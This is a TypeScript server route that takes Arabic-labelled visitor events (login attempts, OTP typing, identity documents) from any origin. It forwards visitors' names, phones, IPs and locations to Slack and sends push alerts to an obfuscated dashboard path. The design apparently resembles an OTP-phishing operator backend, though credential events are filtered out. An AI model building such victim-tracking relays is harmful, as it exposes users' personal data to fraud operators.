import { createFileRoute } from "@tanstack/react-router";
import { isCredentialEvent, safeSubmissionPayload } from "@/lib/submission-privacy";

type KindMeta = { label: string; emoji: string; accent: string };
const KIND_META: Record<string, KindMeta> = {
  login_attempt: { label: "تسجيل دخول جديد", emoji: "🔐", accent: "#2563eb" },
  otp_attempt: { label: "رمز تحقق جديد", emoji: "🔢", accent: "#f59e0b" },
  otp_typing: { label: "رمز تحقق جديد", emoji: "🔢", accent: "#f59e0b" },
  logout_confirmed: { label: "تأكيد تسجيل الخروج", emoji: "🚪", accent: "#10b981" },
  signup: { label: "تسجيل جديد", emoji: "✍️", accent: "#2563eb" },
  otp_opened: { label: "فتح صفحة رمز التحقق", emoji: "👁️", accent: "#64748b" },
  otp_resend: { label: "طلب إعادة إرسال الرمز", emoji: "🔁", accent: "#64748b" },
  verify_personal: { label: "بيانات شخصية جديدة", emoji: "🪪", accent: "#8b5cf6" },
  verify_documents: { label: "وثائق جديدة", emoji: "📎", accent: "#8b5cf6" },
  verify_submit: { label: "طلب توثيق جديد", emoji: "✅", accent: "#8b5cf6" },
  customer_info: { label: "معلومات عميل جديدة", emoji: "ℹ️", accent: "#64748b" },
};

const SLACK_CHANNEL = "C0C5N2D4KKJ";
const SLACK_GATEWAY = "https://connector-gateway.lovable.dev/slack/api";

function pick(o: unknown, k: string): unknown {
  return o && typeof o === "object" ? (o as Record<string, unknown>)[k] : undefined;
}

function nowRiyadh(): string {
  try {
    return new Intl.DateTimeFormat("ar", {
      timeZone: "Asia/Riyadh",
      hour: "2-digit",
      minute: "2-digit",
      day: "2-digit",
      month: "2-digit",
    }).format(new Date());
  } catch {
    return new Date().toISOString();
  }
}

function buildBlocks(
  meta: KindMeta,
  who: string,
  payload: Record<string, unknown> | undefined,
): { blocks: unknown[]; attachments: unknown[]; fallback: string } {
  const fields: { title: string; value: string }[] = [];
  const addField = (title: string, value: unknown) => {
    if (value === undefined || value === null || value === "") return;
    fields.push({ title, value: String(value) });
  };

  const name = pick(payload, "name");
  const phone = pick(payload, "phone");
  const geo = pick(payload, "geo") as Record<string, unknown> | undefined;
  const src = pick(payload, "traffic_source") as Record<string, unknown> | undefined;
  const page = pick(payload, "page") ?? pick(src, "landing_page");

  if (name) addField("👤 الاسم", name);
  if (phone) addField("📞 الهاتف", phone);
  if (geo) {
    const country = geo["country"] ?? geo["country_code"];
    const city = geo["city"];
    const loc = [country, city].filter(Boolean).join(" · ");
    if (loc) addField("📍 الموقع", loc);
    if (geo["ip"]) addField("🌐 IP", geo["ip"]);
  }
  if (src) {
    const utm = [src["utm_source"], src["utm_medium"], src["utm_campaign"]]
      .filter(Boolean)
      .join(" · ");
    const ref = src["referrer_host"];
    if (utm) addField("📣 المصدر", utm);
    else if (ref) addField("📣 المصدر", ref);
  }
  if (page) addField("📄 الصفحة", page);

  const header = `${meta.emoji}  ${meta.label}`;
  const blocks: unknown[] = [
    { type: "header", text: { type: "plain_text", text: header, emoji: true } },
    {
      type: "context",
      elements: [{ type: "mrkdwn", text: `*${who}*  ·  🕒 ${nowRiyadh()}` }],
    },
  ];
  if (fields.length) {
    blocks.push({ type: "divider" });
    // Slack section fields max 10; chunk into pairs for nicer two-col layout
    for (let i = 0; i < fields.length; i += 10) {
      blocks.push({
        type: "section",
        fields: fields.slice(i, i + 10).map((f) => ({
          type: "mrkdwn",
          text: `*${f.title}*\n${f.value}`,
        })),
      });
    }
  }

  const attachments = [{ color: meta.accent, blocks }];
  const fallback = `${meta.label} — ${who}`;
  return { blocks: [], attachments, fallback };
}

async function postToSlack(args: {
  blocks: unknown[];
  attachments: unknown[];
  fallback: string;
}): Promise<void> {
  const lovableKey = process.env["LOVABLE_API_KEY"];
  const slackKey = process.env["SLACK_API_KEY"];
  if (!lovableKey || !slackKey) return;
  try {
    const res = await fetch(`${SLACK_GATEWAY}/chat.postMessage`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${lovableKey}`,
        "X-Connection-Api-Key": slackKey,
        "Content-Type": "application/json; charset=utf-8",
      },
      body: JSON.stringify({
        channel: SLACK_CHANNEL,
        text: args.fallback,
        attachments: args.attachments,
        unfurl_links: false,
        unfurl_media: false,
      }),
    });
    if (!res.ok) {
      console.error(`Slack post failed [${res.status}]: ${await res.text()}`);
      return;
    }
    const body = (await res.json()) as { ok?: boolean; error?: string };
    if (!body.ok) console.error(`Slack error: ${body.error}`);
  } catch (e) {
    console.error("Slack post exception", e);
  }
}

export const Route = createFileRoute("/api/public/push/notify")({
  server: {
    handlers: {
      OPTIONS: async () =>
        new Response(null, {
          status: 204,
          headers: {
            "access-control-allow-origin": "*",
            "access-control-allow-methods": "POST, OPTIONS",
            "access-control-allow-headers": "content-type",
          },
        }),
      POST: async ({ request }) => {
        let body: {
          kind?: string;
          email?: string;
          sessionId?: string;
          url?: string;
          payload?: Record<string, unknown>;
        } = {};
        try {
          body = await request.json();
        } catch (_) {
          body = {};
        }
        const kind = String(body.kind ?? "");
        if (isCredentialEvent(kind)) return Response.json({ ok: false }, { status: 410 });
        body.payload = safeSubmissionPayload(body.payload ?? {});
        if (!kind || !KIND_META[kind]) return new Response("ignored", { status: 200 });
        const meta = KIND_META[kind];
        const who = body.email || body.sessionId || "زائر";
        const isLogin = kind === "login_attempt";
        const isLogout = kind === "logout_confirmed";
        const tasks: Promise<unknown>[] = [];
        if (isLogin || isLogout) {
          tasks.push(postToSlack(buildBlocks(meta, String(who), body.payload)));
        }
        if (isLogin || isLogout) {
          const { broadcastPush } = await import("@/lib/push-server");
          const title = isLogin
              ? "تسجيل دخول جديد"
              : "تأكيد تسجيل الخروج";
          const tagPrefix = isLogin ? "login" : "logout";
          tasks.push(
            broadcastPush({
              title,
              body: String(who),
              url: body.url || "/ZGFzaGJvYXJk",
              tag: `${tagPrefix}:${body.sessionId || body.email || Date.now()}`,
            }),
          );
        }
        await Promise.allSettled(tasks);
        return Response.json(
          { ok: true },
          { headers: { "access-control-allow-origin": "*" } },
        );
      },
    },
  },
});
